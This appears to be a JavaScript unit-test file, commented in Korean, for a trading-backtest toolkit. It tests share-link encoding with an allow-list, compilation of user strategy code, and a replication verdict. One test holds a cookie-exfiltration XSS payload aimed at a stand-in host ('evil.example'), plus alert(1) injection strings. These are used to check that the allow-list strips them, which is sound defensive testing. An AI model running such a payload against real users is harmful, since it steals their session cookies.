const { test } = require('node:test');
const assert = require('node:assert/strict');

const {
  encodeShareConfig,
  decodeShareConfig,
  SHARE_KEYS,
  compileUserStrategy,
  campaignVerdict,
} = require('../src/labkit');

// ---- 공유 링크 ----
// 사용자 전략(임의 JS)과 공유 링크를 순진하게 합치면 XSS가 된다. 링크에 코드를
// 담으면 받는 사람 브라우저에서 임의 코드가 실행되기 때문이다.
// 그래서 인코더는 **허용 목록에 있는 설정 키만** 담는다. 코드는 절대 담지 않는다.

test('encodeShareConfig ↔ decodeShareConfig: 왕복하면 같은 설정', () => {
  const cfg = { symbol: 'BTCUSDT', interval: '1h', days: 365, strategy: 'emaCross', params: { fast: 20 } };
  assert.deepEqual(decodeShareConfig(encodeShareConfig(cfg)), cfg);
});

test('encodeShareConfig: 허용 목록에 없는 키는 버린다 (코드 유출 차단)', () => {
  const encoded = encodeShareConfig({
    symbol: 'BTCUSDT',
    strategy: 'custom',
    code: 'fetch("https://evil.example/"+document.cookie)',
    userCode: 'alert(1)',
  });
  const back = decodeShareConfig(encoded);
  assert.equal(back.code, undefined);
  assert.equal(back.userCode, undefined);
  assert.equal(back.symbol, 'BTCUSDT');
});

test('encodeShareConfig: 허용 키 목록에 코드성 키가 없다', () => {
  for (const k of SHARE_KEYS) {
    assert.ok(!/code|source|fn|script/i.test(k), `코드성 키가 허용 목록에 있다: ${k}`);
  }
});

test('decodeShareConfig: 손상된 문자열은 Error (조용히 빈 설정을 돌려주지 않는다)', () => {
  assert.throws(() => decodeShareConfig('!!!not-base64!!!'), /공유/);
  assert.throws(() => decodeShareConfig(''), /공유/);
});

test('decodeShareConfig: JSON이 객체가 아니면 Error', () => {
  const bad = Buffer.from('[1,2,3]').toString('base64url');
  assert.throws(() => decodeShareConfig(bad), /공유/);
});

test('decodeShareConfig: 디코딩 결과에도 허용 목록을 다시 적용한다', () => {
  // 손으로 만든 악성 링크 방어 — 인코더를 거치지 않고 들어올 수 있다
  const evil = Buffer.from(JSON.stringify({ symbol: 'BTCUSDT', code: 'alert(1)' })).toString('base64url');
  assert.equal(decodeShareConfig(evil).code, undefined);
});

// ---- 사용자 전략 컴파일 ----
// 사용자가 자기 전략을 못 돌리면 "당신의 전략을 검증한다"는 제품 카피가 거짓이 된다.
// 다만 출력이 엔진 규약을 지키는지는 반드시 검사해야 한다 — 잘못된 배열은
// 조용히 이상한 성과를 만들어낸다.

const CANDLES = Array.from({ length: 30 }, (_, i) => ({
  openTime: i * 3600000, open: 100 + i, high: 101 + i, low: 99 + i, close: 100 + i,
  volume: 1, closeTime: i * 3600000 + 3599999,
}));

test('compileUserStrategy: 함수 본문을 받아 노출 배열을 만든다', () => {
  const fn = compileUserStrategy('return candles.map(() => 1);');
  assert.deepEqual(fn(CANDLES, {}), CANDLES.map(() => 1));
});

test('compileUserStrategy: params와 지표 helpers를 쓸 수 있다', () => {
  const fn = compileUserStrategy(`
    const e = helpers.ema(helpers.closes(candles), params.period);
    return candles.map((c, i) => (e[i] != null && c.close > e[i] ? 1 : 0));
  `);
  const out = fn(CANDLES, { period: 5 });
  assert.equal(out.length, CANDLES.length);
  assert.ok(out.every((p) => p === 0 || p === 1));
});

test('compileUserStrategy: 길이가 캔들과 다르면 Error', () => {
  const fn = compileUserStrategy('return [1, 0];');
  assert.throws(() => fn(CANDLES, {}), /길이/);
});

test('compileUserStrategy: -1~1 범위를 벗어나면 Error', () => {
  const fn = compileUserStrategy('return candles.map(() => 5);');
  assert.throws(() => fn(CANDLES, {}), /범위|-1/);
});

test('compileUserStrategy: 배열이 아닌 것을 반환하면 Error', () => {
  const fn = compileUserStrategy('return "nope";');
  assert.throws(() => fn(CANDLES, {}), /배열/);
});

test('compileUserStrategy: 문법 오류는 컴파일 시점에 Error로 감싼다', () => {
  assert.throws(() => compileUserStrategy('return ((('), /전략 코드/);
});

test('compileUserStrategy: 실행 중 예외도 Error로 감싼다', () => {
  const fn = compileUserStrategy('throw new Error("boom");');
  assert.throws(() => fn(CANDLES, {}), /boom/);
});

// ---- 캠페인 판정 ----
// 탐색에서 통과한 것이 확인에서 재현되는지 자동으로 본다. 이 프로젝트에서
// 사전 등록 가설이 네 번 기각된 경로를 도구가 대신 잡아주는 기능이다.

test('campaignVerdict: 탐색 통과 + 확인 통과면 재현됨', () => {
  const v = campaignVerdict({
    exploration: [{ passes: true }, { passes: true }, { passes: false }],
    confirmation: [{ passes: true }, { passes: true }, { passes: false }],
  });
  assert.equal(v.replicated, true);
  assert.match(v.headline, /재현/);
});

test('campaignVerdict: 탐색 통과 + 확인 실패면 재현 실패 경고', () => {
  const v = campaignVerdict({
    exploration: [{ passes: true }, { passes: true }, { passes: true }],
    confirmation: [{ passes: false }, { passes: false }, { passes: false }],
  });
  assert.equal(v.replicated, false);
  assert.match(v.headline, /재현 실패/);
});

test('campaignVerdict: 탐색부터 과반 미달이면 확인 이전에 기각', () => {
  const v = campaignVerdict({
    exploration: [{ passes: false }, { passes: false }, { passes: true }],
    confirmation: [{ passes: true }, { passes: true }, { passes: true }],
  });
  assert.equal(v.replicated, false);
  assert.match(v.headline, /탐색/);
});

test('campaignVerdict: 통과율을 함께 돌려준다', () => {
  const v = campaignVerdict({
    exploration: [{ passes: true }, { passes: false }],
    confirmation: [{ passes: true }, { passes: true }],
  });
  assert.equal(v.explorationPassed, 1);
  assert.equal(v.explorationTotal, 2);
  assert.equal(v.confirmationPassed, 2);
});

test('campaignVerdict: 한쪽이 비어 있으면 Error (판정 불가를 통과로 위장하지 않는다)', () => {
  assert.throws(() => campaignVerdict({ exploration: [], confirmation: [{ passes: true }] }), /비어/);
});

test('공유 링크: 한글이 든 설정도 왕복한다 (btoa는 latin1만 받는다)', () => {
  const cfg = { symbol: 'BTCUSDT', params: { 메모: '과최적화 확인용', fast: 20 } };
  assert.deepEqual(decodeShareConfig(encodeShareConfig(cfg)), cfg);
});

test('공유 링크: base64url이라 URL에 그대로 넣을 수 있다', () => {
  const encoded = encodeShareConfig({ symbol: 'BTCUSDT', params: { a: 1, b: 2, c: 3, d: 4 } });
  assert.ok(!/[+/=]/.test(encoded), `URL 비안전 문자 포함: ${encoded}`);
});
